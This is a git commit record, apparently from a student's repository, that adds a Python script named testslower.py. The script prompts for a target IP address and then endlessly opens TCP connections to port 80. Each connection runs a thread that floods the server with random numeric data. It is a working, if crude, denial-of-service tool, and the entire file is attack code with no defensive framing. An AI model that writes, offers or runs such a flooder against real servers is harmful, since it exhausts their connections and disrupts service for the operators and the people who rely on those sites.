9609af95e64b400f185c3f05a3d8e072d642ab51
Ethan Yun <ethanyun@ohs.stanford.edu>
2018-11-17 18:58:20 -0800

    Added testslower.py file

---
+++ testslower.py
@@ -0,0 +1,21 @@
+import socket
+import random
+import threading
+
+class Client:
+	def __init__(self, ip, port):
+		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.sock.connect((ip, port))
+		iThread = threading.Thread(target=self.handler)
+		iThread.daemon = True
+		iThread.start()
+
+	def handler(self):
+		while True:
+			self.sock.send(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
+
+if __name__ == '__main__':
+	ipthing = input("IP PLES: ")
+	loof = []
+	while True:
+		loof.append(Client(ipthing, 80))
